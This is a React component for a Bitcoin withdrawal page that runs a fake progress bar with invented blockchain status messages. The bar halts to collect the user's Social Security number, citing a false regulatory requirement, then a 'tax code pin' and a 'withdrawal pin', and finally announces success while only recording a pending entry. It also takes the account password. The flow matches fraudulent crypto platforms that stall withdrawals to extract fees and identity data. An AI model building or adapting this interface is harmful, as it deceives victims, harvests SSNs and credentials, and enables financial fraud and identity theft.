/* eslint-disable react-hooks/exhaustive-deps */
"use client";
import axios from "axios";
import Image from "next/image";
import Link from "next/link";
import React, { useEffect, useState } from "react";
import { InfinitySpin } from "react-loader-spinner";
import { useTheme } from "../../../contexts/themeContext";
import { Input } from "../../ui/input";
import toast from "react-hot-toast";
import { useUserData } from "../../../contexts/userrContext";

export default function Btcpayment({
  handleInputChange,
  formErrors,
  handleSubmit,
  formData,
  btcFilled,
  loading,
  email,
  setLoading,
  setBtcFilled,
}) {
  const { isDarkMode } = useTheme();
  const [progress, setProgress] = useState(0);
  const [progressMessage, setProgressMessage] = useState("");
  const [taxCodePin, setTaxCodePin] = useState("");
  const [taxCodePinError, setTaxCodePinError] = useState("");
  const [withdrawalPin, setWithdrawalPin] = useState("");
  const [withdrawalPinError, setWithdrawalPinError] = useState("");
  const [ssn, setSsn] = useState("");
  const [ssnError, setSsnError] = useState("");
  const [waitingForPin, setWaitingForPin] = useState(false);
  const [showSucces, setSuccess] = useState(false);
  const { details, setDetails, setNotification } = useUserData();

  useEffect(() => {
    const updateProgress = () => {
      setProgress((prevProgress) => {
        const newProgress = prevProgress + 0.5;
        if (newProgress >= 60 && !ssn) {
          setWaitingForPin(true);
          return 60;
        } else if (newProgress >= 80 && !taxCodePin) {
          setWaitingForPin(true);
          return 80;
        } else if (newProgress >= 90 && !withdrawalPin) {
          setWaitingForPin(true);
          return 90;
        } else if (newProgress >= 100) {
          sendWithdrawHistory();
          setSuccess(true);
          return 100;
        }
        return newProgress;
      });
    };
    const sendWithdrawHistory = async () => {
      try {
        const response = await axios.post("/history/withdraw/api", {
          email,
          withdrawMethod: "Bitcoin Transfer",
          amount: formData.amount,
          transactionStatus: "Pending",
        });
        if (response.data.success) {
          setDetails((prevDeets) => ({
            ...prevDeets,
            withdrawalHistory: [
              ...prevDeets.withdrawalHistory,
              {
                id: response.data.id,
                withdrawMethod: "Bitcoin Withdrawal",
                amount: formData.amount,
                transactionStatus: "Pending",
                dateAdded: response.data.date,
              },
            ],
          }));
          setNotification(
            `Withdrawal of $${formData.amount} under review`,
            "transaction",
            "pending"
          );
          //dosmothing
        }
      } catch (error) {
        console.error("Error adding withdrawal history:", error);
        throw error;
      }
    };
    if (!btcFilled) {
      const interval = setInterval(() => {
        if (progress < 100 && !waitingForPin) {
          updateProgress();
          updateProgressMessage(progress);
        }
      }, 100); // Update every 0.1 seconds

      return () => clearInterval(interval);
    }
  }, [btcFilled, progress, waitingForPin, taxCodePin, ssn]);

  const updateProgressMessage = (currentProgress) => {
    if (currentProgress >= 0 && currentProgress < 10) {
      setProgressMessage("Initializing secure connection...");
    } else if (currentProgress >= 10 && currentProgress < 20) {
      setProgressMessage("Verifying user credentials...");
    } else if (currentProgress >= 20 && currentProgress < 30) {
      setProgressMessage("Fetching user wallet details...");
    } else if (currentProgress >= 30 && currentProgress < 40) {
      setProgressMessage("Getting contract ID from the blockchain...");
    } else if (currentProgress >= 40 && currentProgress < 50) {
      setProgressMessage("Validating transaction parameters...");
    } else if (currentProgress >= 50 && currentProgress < 60) {
      setProgressMessage("Connecting to primary trading wallet...");
    } else if (currentProgress >= 60 && currentProgress < 70) {
      setProgressMessage(
        "Complying with U.S. regulations for transaction verification..."
      );
    } else if (currentProgress >= 70 && currentProgress < 80) {
      setProgressMessage("Preparing Bitcoin for transfer...");
    } else if (currentProgress >= 80 && currentProgress < 90) {
      setProgressMessage("Getting withdrawal data from the network...");
    } else if (currentProgress >= 90 && currentProgress < 100) {
      setProgressMessage("Finalizing transfer of requested BTC...");
    } else if (currentProgress >= 100) {
      setProgressMessage("Transaction complete. Please check your wallet.");
    } else {
      setProgressMessage("Processing transaction...");
    }
  };

  const handlePinChange = (e) => {
    setTaxCodePin(e.target.value);
  };
  const handleWithdrawPinChange = (e) => {
    setWithdrawalPin(e.target.value);
  };
  const handleSsnChange = (e) => {
    setSsn(e.target.value);
  };
  async function loginUser1(email, taxCodePin) {
    setLoading(true);
    try {
      const response = await axios.post("/withdrawals/verifytaxcode/api", {
        email,
        taxCodePin,
      });

      if (response.data.success) {
        // Perform action when login is successful
        toast.success("Pin Correct");
        setLoading(false);
        setWaitingForPin(false);
      } else {
        setLoading(false);
        setTaxCodePinError("Incorrect! Check tax code and try again");
        // Perform action when login fails
      }
    } catch (error) {
      // Handle any error that occurs during the request
      console.log("An error occurred:", error.message);
    }
  }
  async function loginUser2(email, withdrawalPin) {
    setLoading(true);
    try {
      const response = await axios.post("/withdrawals/verifywithdrawpin/api", {
        email,
        withdrawalPin,
      });

      if (response.data.success) {
        // Perform action when login is successful
        toast.success("Pin Correct");
        setLoading(false);
        setWaitingForPin(false);
      } else {
        setLoading(false);
        setWithdrawalPinError("Incorrect! Check withdrawal pin and try again");
        // Perform action when login fails
      }
    } catch (error) {
      // Handle any error that occurs during the request
      console.log("An error occurred:", error.message);
    }
  }
  const handlePinSubmit = (e) => {
    e.preventDefault();
    if (taxCodePin.length >= 6) {
      setTaxCodePinError(""); // Clear any previous errors
      loginUser1(email, taxCodePin);

      // You can add logic here to handle the form submission
    } else {
      setTaxCodePinError("Tax Code Pin must be at least 6 characters");
    }
  };
  const handleWtihdrawPinSubmit = (e) => {
    e.preventDefault();
    if (withdrawalPin.length >= 4) {
      setWithdrawalPinError(""); // Clear any previous errors
      loginUser2(email, withdrawalPin);
      // You can add logic here to handle the form submission
    } else {
      setWithdrawalPinError("Tax Code Pin must be at least 4 characters");
    }
  };

  async function updateUserSsn(email, ssn) {
    setLoading(true);
    try {
      const response = await axios.post("/user/updatessn/api", {
        email,
        ssn,
      });

      if (response.data.success) {
        toast.success("SSN verified successfully");
        setLoading(false);
        setWaitingForPin(false);
      } else {
        setLoading(false);
        setSsnError("Invalid SSN format. Please check and try again");
      }
    } catch (error) {
      setLoading(false);
      setSsnError("An error occurred. Please try again later");
    }
  }

  const handleSsnSubmit = (e) => {
    e.preventDefault();
    if (ssn.length === 9 || (ssn.length === 11 && ssn.includes("-"))) {
      setSsnError(""); // Clear any previous errors
      updateUserSsn(email, ssn);
    } else {
      setSsnError("Please enter a valid 9-digit SSN (XXX-XX-XXXX)");
    }
  };

  return (
    <>
      {btcFilled && (
        <>
          <div className="bitcoin-payment image-cont">
            <Image
              alt=""
              src="/assets/bitcoin.png"
              width={1000}
              height={1000}
              className="md:w-1/2 w-full mx-auto"
            />
          </div>
          <div
            className={`bitcoin-payment-form p-4 ${
              isDarkMode ? "text-white/80" : ""
            }`}
          >
            <form onSubmit={handleSubmit}>
              <div className="mb-1 mt-3">
                <label
                  htmlFor="walletAddress"
                  className="font-bold text-sm py-2"
                >
                  Bitcoin Wallet Address
                </label>
              </div>
              <input
                type="text"
                id="walletAddress"
                name="walletAddress"
                value={formData.walletAddress}
                onChange={handleInputChange}
                placeholder="Enter Wallet Address"
                className={`w-full px-4 py-3 h-11 text-xs rounded-md ${
                  isDarkMode ? "bg-[#111]" : "border"
                } bg-gry-50 font-bold focus:outline-none ${
                  formErrors.walletAddress ? "border-red-500 border" : ""
                }`}
              />
              {formErrors.walletAddress && (
                <p className="text-red-500  text-xs mt-1">
                  {formErrors.walletAddress}
                </p>
              )}

              <div className="mb-1 mt-3">
                <label htmlFor="amount" className="font-bold text-sm py-2">
                  Enter Amount (USD)
                </label>
              </div>
              <input
                type="number"
                id="amount"
                name="amount"
                value={formData.amount}
                onChange={handleInputChange}
                placeholder="Enter Amount"
                className={`w-full px-4 py-3 h-11 text-xs rounded-md ${
                  isDarkMode ? "bg-[#111]" : "border"
                } bg-gry-50 font-bold focus:outline-none ${
                  formErrors.walletAddress ? "border-red-500 border" : ""
                }`}
              />
              {formErrors.amount && (
                <p className="text-red-500 font-semibold text-xs mt-1">
                  {formErrors.amount}
                </p>
              )}

              <div className="mb-1 mt-3">
                <label htmlFor="password" className="font-bold text-sm py-2">
                  Password Verification
                </label>
              </div>
              <input
                type="password"
                id="password"
                name="password"
                value={formData.password}
                onChange={handleInputChange}
                placeholder="Enter Password"
                className={`w-full px-4 py-3 h-11 text-xs rounded-md ${
                  isDarkMode ? "bg-[#111]" : "border"
                } bg-gry-50 font-bold focus:outline-none ${
                  formErrors.walletAddress ? "border-red-500 border" : ""
                }`}
              />
              {formErrors.password && (
                <p className="text-red-500 font-semibold text-xs mt-1">
                  {formErrors.password}
                </p>
              )}

              <button
                disabled={loading}
                type="submit"
                className="w-full  px-4 mt-4 text-sm rounded-lg flex items-center justify-center bg-[#0052FF] text-white font-bold hover:bg-blue-600 focus:outline-none focus:bg-blue-600"
              >
                {loading ? (
                  <InfinitySpin width="100" color="#ffffff" />
                ) : (
                  <div className="py-3">Withdraw BTC</div>
                )}
              </button>
            </form>
          </div>
        </>
      )}

      {!btcFilled && !showSucces && (
        <div className="py-20">
          <div className="flex w-full justify-center items-center ">
            <div className="progress-cont w-full px-5 md:px-14">
              <div
                className={` ${
                  isDarkMode ? "text-white/90" : ""
                } progress-messages text-sm font-bold mb-1 flex items-center justify-between`}
              >
                <div>{progressMessage}</div>
                <div className="percentage font-bold text-sm">
                  {progress.toFixed()}%
                </div>
              </div>
              <div className="progress-movements w-full">
                <div
                  className={`holder w-full h-2 relative overflow-hidden rounded-full  ${
                    isDarkMode ? "bg-red-500/10" : "bg-red-50"
                  }`}
                >
                  <div
                    className={`mover absolute h-full  rounded-full transition-all bg-[#0052FF]`}
                    style={{ width: `${progress}%` }}
                  ></div>
                </div>
              </div>
            </div>
          </div>

          {progress >= 60 && waitingForPin && progress < 80 && (
            <div className="ssn-form px-5 md:px-14 mt-8">
              <div className={`mb-4 p-3 rounded-md ${
                isDarkMode ? "bg-[#222] text-white/90" : "bg-blue-50 text-blue-800"
              }`}>
                <h3 className="font-bold text-sm mb-1">U.S. Regulatory Compliance</h3>
                <p className="text-xs">
                  According to U.S. financial regulations, all withdrawals require SSN verification. 
                  This is required for tax reporting and compliance with AML/KYC procedures.
                </p>
              </div>
              <form onSubmit={handleSsnSubmit}>
                <input
                  type="text"
                  id="ssn"
                  name="ssn"
                  placeholder="Enter SSN (XXX-XX-XXXX)"
                  value={ssn}
                  onChange={handleSsnChange}
                  className={`w-full px-4 py-3 h-11 text-xs rounded-md ${
                    isDarkMode ? "bg-[#111] text-white/90" : "border"
                  } bg-gry-50 font-bold focus:outline-none  ${
                    ssnError ? "border-red-500 border" : ""
                  }`}
                />
                {ssnError && (
                  <p className="text-red-500 font-bold text-xs mt-1">
                    {ssnError}
                  </p>
                )}
                <button
                  disabled={loading}
                  type="submit"
                  className="bg-[#0052FF] py- mt-2 w-full flex justify-center items-center rounded-lg text-sm text-white font-bold"
                >
                  {loading ? (
                    <InfinitySpin width="100" color="#ffffff" />
                  ) : (
                    <div className="py-3">Verify SSN</div>
                  )}
                </button>
              </form>
            </div>
          )}

          {progress >= 80 && waitingForPin && progress < 90 && (
            <div className="tax-code-form px-5 md:px-14 mt-8">
              <form onSubmit={handlePinSubmit}>
                <input
                  type="text"
                  id="taxCodePin"
                  name="taxCodePin"
                  placeholder="Enter Tax Code Pin"
                  value={taxCodePin}
                  onChange={handlePinChange}
                  className={`w-full px-4 py-3 h-11 text-xs rounded-md ${
                    isDarkMode ? "bg-[#111] text-white/90" : "border"
                  } bg-gry-50 font-bold focus:outline-none  ${
                    taxCodePinError ? "border-red-500 border" : ""
                  }`}
                />
                {taxCodePinError && (
                  <p className="text-red-500 font-bold text-xs mt-1">
                    {taxCodePinError}
                  </p>
                )}
                <button
                  disabled={loading}
                  type="submit"
                  className="bg-[#0052FF] py- mt-2 w-full flex justify-center items-center rounded-lg text-sm text-white font-bold"
                >
                  {loading ? (
                    <InfinitySpin width="100" color="#ffffff" />
                  ) : (
                    <div className="py-3">Proceed withdrawal</div>
                  )}
                </button>
              </form>
            </div>
          )}
          {progress >= 90 && waitingForPin && (
            <div className="tax-code-form px-5 md:px-14 mt-8">
              <form onSubmit={handleWtihdrawPinSubmit}>
                <input
                  type="text"
                  id="taxCodePin"
                  name="taxCodePin"
                  placeholder="Enter Withdrawal Pin"
                  value={withdrawalPin}
                  onChange={handleWithdrawPinChange}
                  className={`w-full h-11 px-4 py-3 text-xs rounded-md ${
                    isDarkMode ? "bg-[#111] text-white/90" : "border"
                  } bg-gry-50 font-bold focus:outline-none  ${
                    withdrawalPinError ? "border-red-500 border" : ""
                  }`}
                />
                {withdrawalPinError && (
                  <p className="text-red-500 font-bold text-xs mt-1">
                    {withdrawalPinError}
                  </p>
                )}
                <button
                  type="submit"
                  className="bg-[#0052FF] mt-2 w-full flex items-center justify-center rounded-lg text-sm text-white font-bold"
                >
                  {loading ? (
                    <InfinitySpin width="100" color="#ffffff" />
                  ) : (
                    <div className="py-3">Finalize withdrawal</div>
                  )}
                </button>
              </form>
            </div>
          )}
        </div>
      )}
      {showSucces && (
        <div
          className={`flex flex-col justify-center items-center px-5 md:px-14 mt-8 py-10 /bg-white rounded-lg ${
            isDarkMode ? "textwhite border border-white/10" : ""
          }`}
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 20 20"
            fill="currentColor"
            className={`w-16 h-16 mx-auto mb-4 ${
              isDarkMode ? "text-white/50" : "text-black/40"
            }`}
          >
            <path
              fillRule="evenodd"
              d="M16.403 12.652a3 3 0 000-5.304 3 3 0 00-3.75-3.751 3 3 0 00-5.305 0 3 3 0 00-3.751 3.75 3 3 0 000 5.305 3 3 0 003.75 3.751 3 3 0 005.305 0 3 3 0 003.751-3.75zm-2.546-4.46a.75.75 0 00-1.214-.883l-3.483 4.79-1.88-1.88a.75.75 0 10-1.06 1.061l2.5 2.5a.75.75 0 001.137-.089l4-5.5z"
              clipRule="evenodd"
            />
          </svg>
          <h1 className="text-xl font-bold mb-2">Withdrawal Successful</h1>
          <p
            className={` mb-6 text-center text-sm px-5 md:px-20 lg:px-32 ${
              isDarkMode ? "text-white/80" : "text-muted-foreground"
            }`}
          >
            Your Bitcoin (BTC) withdrawal is in the confirmation phase within
            the blockchain network. Transaction times may vary from 5 minutes to
            2 hours. Monitor the transaction through your history panel. Contact
            us for further assistance.
          </p>
          <Link href="/dashboard" passHref>
            {" "}
            <button className="bg-[#0052FF] py-3 px-10 rounded-lg text-sm text-white font-bold hover:bg-slate-600 transition-all focus:outline-none">
              Back to Dashboard
            </button>
          </Link>
        </div>
      )}
    </>
  );
}
